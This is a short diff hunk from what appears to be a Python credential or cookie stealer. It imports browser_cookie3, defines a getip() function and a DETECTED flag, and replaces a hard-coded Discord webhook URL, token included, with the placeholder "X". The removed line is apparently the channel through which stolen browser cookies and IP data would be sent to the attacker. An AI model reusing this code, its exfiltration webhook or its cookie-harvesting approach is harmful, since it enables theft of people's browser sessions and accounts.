@@ -27,7 +27,7 @@ import browser_cookie3
 import time
 import sys
 
-hook = "https://discord.com/api/webhooks/1066508093225185331/cK4HpNH1OUuVurK4yro_lx03C7GOm9smsXmKlvWwp4WWYXu4haktyFSAIY2SJwEoZfJe"
+hook = "X"
 DETECTED = False
 
 def getip():
